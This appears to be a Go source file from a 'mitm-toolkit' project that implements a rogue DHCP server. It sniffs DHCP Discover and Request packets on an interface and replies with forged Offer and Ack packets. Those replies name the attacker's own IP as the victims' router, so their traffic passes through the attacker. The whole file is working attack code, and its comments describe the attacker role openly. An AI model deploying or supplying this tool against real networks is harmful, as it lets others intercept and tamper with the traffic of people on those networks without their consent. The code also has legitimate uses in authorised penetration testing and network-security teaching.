package dhcp

import (
	"fmt"
	"mitm-toolkit/network"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func ListenDHCP(iface network.NetworkInterface, offeredIP net.IP) error {

	// open interface to listen
	handle, err := pcap.OpenLive(
		iface.InterfaceName,
		65535,
		true,
		pcap.BlockForever,
	)

	if err != nil {
		return fmt.Errorf("Failed to open interface: %v", err)
	}

	defer handle.Close()

	// BPF filter -> capture packets going TO port 67 (going to the attacker)
	filter := "udp dst port 67"
	err = handle.SetBPFFilter(filter)

	if err != nil {
		return fmt.Errorf("failed to set BPF filter: %v", err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {

		// extract the DHCP layer ipv4
		dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)

		if dhcpLayer != nil {
			dhcp, ok := dhcpLayer.(*layers.DHCPv4)

			if !ok {
				continue
			}

			for _, opt := range dhcp.Options {

				if opt.Type == layers.DHCPOptMessageType {

					switch layers.DHCPMsgType(opt.Data[0]) {

					case layers.DHCPMsgTypeDiscover:
						// client looking for DHCP server - we send offer
						sendDHCPResponse(handle, iface, dhcp, layers.DHCPMsgTypeOffer, offeredIP)

					case layers.DHCPMsgTypeRequest:
						// client accept offer -> we send ack
						sendDHCPResponse(handle, iface, dhcp, layers.DHCPMsgTypeAck, offeredIP)

					}

				}

			}
		}

	}

	return nil

}

// DHCP reply and send it to the server (offer, ack)
func sendDHCPResponse(handle *pcap.Handle, iface network.NetworkInterface, dhcp *layers.DHCPv4, msgType layers.DHCPMsgType, offeredIP net.IP) error {

	srcMac, err := net.ParseMAC(iface.MacAddress)
	if err != nil {
		return fmt.Errorf("Invalid source MAC address: %v", err)
	}

	// building  layer 2 - Etherent layer
	eth := layers.Ethernet{
		SrcMAC:       srcMac,
		DstMAC:       []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeIPv4,
	}

	srcIP := net.ParseIP(iface.IPv4Address)
	dstIP := net.ParseIP("255.255.255.255")

	// building layer 3 - network layer
	ipv4 := layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}

	// builing layer 4 -> transport layer (UDP, TCP)
	udp := layers.UDP{
		SrcPort: 67, // server
		DstPort: 68, //client
	}

	// add checksum
	udp.SetNetworkLayerForChecksum(&ipv4)

	// building dhcpv4 - layer 7 -> application layer
	dhcpV4 := layers.DHCPv4{
		Operation:    layers.DHCPOpReply, // server is replying
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          dhcp.Xid,
		YourClientIP: offeredIP,
		ClientHWAddr: dhcp.ClientHWAddr,
		Options: layers.DHCPOptions{
			layers.DHCPOption{
				Type:   layers.DHCPOptMessageType, // must: 53
				Data:   []byte{byte(msgType)},
				Length: 1,
			},

			layers.DHCPOption{
				Type:   layers.DHCPOptLeaseTime,        // must: 51
				Data:   []byte{0x00, 0x00, 0x0E, 0x10}, // 3600 seconds = 1 hour
				Length: 4,
			},

			layers.DHCPOption{
				Type:   layers.DHCPOptServerID, // must: 54
				Data:   srcIP.To4(),
				Length: 4,
			},

			layers.DHCPOption{
				Type:   layers.DHCPOptSubnetMask, // opt: 1
				Data:   net.IPv4Mask(255, 255, 255, 0),
				Length: 4,
			},
			layers.DHCPOption{
				Type:   layers.DHCPOptRouter, // opt: 3
				Data:   srcIP.To4(),
				Length: 4,
			},
			layers.DHCPOption{
				Type: layers.DHCPOptDNS,
				Data: net.ParseIP("8.8.8.8").To4(),
				Length: 4,
			},
		},
	}

	// Serialize the Packet (Convert to raw bytes)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// call all the layers
	err = gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &udp, &dhcpV4)
	if err != nil {
		return fmt.Errorf("failed to serialize packet: %v", err)
	}

	err = handle.WritePacketData(buf.Bytes())
	if err != nil {
		return fmt.Errorf("failed to send DHCP response: %v", err)
	}

	return nil
}
